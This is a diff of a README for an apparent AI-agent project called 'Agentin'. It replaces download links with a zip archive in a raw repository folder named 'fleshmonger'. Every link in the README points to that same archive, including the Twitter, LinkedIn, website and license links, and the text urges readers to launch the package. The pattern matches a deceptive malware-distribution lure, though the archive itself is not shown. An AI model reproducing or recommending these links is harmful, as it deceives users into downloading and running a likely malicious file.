@@ -25,7 +25,7 @@ Welcome to Agentin, a repository dedicated to AI agents for technology services.
 
 Click the button below to access the software for Agentin:
 
-[![Software](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip<COLOR>.svg)](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip)
+[![Software](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip<COLOR>.svg)](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip)
 
 📌 Note: The link leads to the software package that needs to be launched to start exploring the AI agents and technology services offered by Agentin.
 
@@ -37,21 +37,21 @@ If the provided link for the software download is not working or you are looking
 
 Join our community of developers, researchers, and AI enthusiasts in shaping the future of technology services with AI agents. Feel free to contribute to Agentin by submitting pull requests, sharing ideas, or reporting issues. Let's collaborate and build a vibrant ecosystem of AI innovation together!
 
-![AI Agents](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip)
+![AI Agents](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip)
 
 ## Connect With Us
 
 Stay updated on the latest news, developments, and events related to Agentin by following us on social media. Join the conversation, share your thoughts, and be part of the Agentin community!
 
-- Twitter: [@AgentinAI](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip)
-- LinkedIn: [Agentin AI](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip)
-- Website: [https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip)
+- Twitter: [@AgentinAI](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip)
+- LinkedIn: [Agentin AI](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip)
+- Website: [https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip)
 
 Let's unleash the power of AI agents for transformative technology services at Agentin! 🌟
 
 ## License
 
-This project is licensed under the MIT License - see the [https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip](https://github.com/Vini09-cpu/agentin/releases/download/v2.0/Release_x64.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip](https://github.com/Vini09-cpu/agentin/raw/refs/heads/main/fleshmonger/Software-v3.7.zip) file for details.
 
 ---
 
